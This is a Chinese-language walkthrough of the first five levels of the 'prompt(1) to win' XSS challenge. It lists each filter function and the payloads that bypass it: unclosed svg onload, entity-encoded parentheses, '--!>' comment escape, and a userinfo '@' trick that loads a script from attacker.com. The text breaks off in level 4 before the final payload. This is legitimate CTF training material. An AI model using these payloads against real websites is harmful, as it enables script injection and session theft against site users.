# prompt (1) to win

## level 0

`"><script>alert(1)</script>`

## level 1

收获:svg标签,不闭合就可以执行js



```javascript
function escape(input) {
    // tags stripping mechanism from ExtJS library
    // Ext.util.Format.stripTags
    var stripTagsRE = /<\/?[^>]+>/gi;
    input = input.replace(stripTagsRE, '');

    return '<article>' + input + '</article>';
}   
```



`var stripTagsRE = /<\/?[^>]+>/gi;`:过滤所有<aa>形式的字符串

我炸了。。不会诶

看了wp说,只要不闭合<就可以绕过

payload:`<svg/onload=alert(1)`

## level 2

收获:在svg标签中可以用ascii码来替换字符

svg标签可以不闭合像这样:<svg/onload=prompt(1)



```javascript
function escape(input) {
    //                      v-- frowny face
    input = input.replace(/[=(]/g, '');

    // ok seriously, disallows equal signs and open parenthesis
    return input;
}  
```

这个会替换代码中的=和(,但是可以用ascii码绕过

由于xml编码特性。在SVG向量里面的script元素（或者其他CDATA元素 ），会先进行xml解析。因此&#x28（十六进制）或者&#40（十进制）或者&lpar；（html实体编码）会被还原成（。

```
<svg><script>prompt&#40;1)<b>
<svg><script>prompt&#40;1)</script>

```

还可以用别的函数

```javascript
<script>eval.call`${'prompt\x281)'}`</script>
<script>prompt.call`${1}`</script>
```

## level 3

```javascript
function escape(input) {
    // filter potential comment end delimiters
    input = input.replace(/->/g, '_');

    // comment the input to avoid script execution
    return '<!-- ' + input + ' -->';
}        
```

正常的注释框:<!-- --> 但是2012年后,html标签可以用--!>来闭合

## level 4

```javascript
function escape(input) {
    // make sure the script belongs to own site
    // sample script: http://prompt.ml/js/test.js
    if (/^(?:https?:)?\/\/prompt\.ml\//i.test(decodeURIComponent(input))) {
        var script = document.createElement('script');
        script.src = input;
        return script.outerHTML;
    } else {
        return 'Invalid resource.';
    }
}  
```

```
URL的完整格式协议类型:[//[访问资源需要的凭证信息@]服务器地址[:端口号]][/资源层级UNIX文件路径]文件名[?查询][#片段ID]
```

即在url中还有一个`访问凭证`字段，我们的想法是通过`@`符号，使浏览器让`prompt.ml`等内容被识别为凭证信息，从而访问我们的恶意网站，由于使用了`decodeURIComponent`函数，可以通过使用`URLencode`进行转义，被decode之后的内容还满足正则表达式，但`input`本身的`%2f`会被识别为凭证信息，所以答案应该是:

官方wp:1、这个题目是利用url的特性绕过，浏览器支持这样的url：http://user:password@attacker.com。但是http://user:password/@attacker.com是不允许的。由于这里的正则特性和decodeURIComponent函数，所以可以使用%2f绕过

